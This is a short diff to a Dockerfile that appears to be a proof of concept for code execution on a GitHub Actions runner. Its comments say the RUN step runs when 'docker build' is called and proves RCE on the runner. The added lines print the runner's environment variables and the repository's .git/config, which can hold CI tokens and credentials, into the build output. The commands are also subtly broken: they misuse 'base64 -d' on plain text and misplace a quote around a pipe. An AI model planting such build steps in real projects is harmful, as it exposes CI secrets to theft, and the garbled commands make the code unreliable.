@@ -4,7 +4,7 @@ FROM debian:bookworm-slim
 # This runs on the GitHub Runner immediately when 'docker build' is called.
 # It proves you have RCE on the runner itself.
 RUN apt-get update && apt-get install -y curl && \
-    echo "$(env) | base64 -d"
+    echo "$(env) | base64 -d" && \
     cat .git/config | base64 -d
     
 
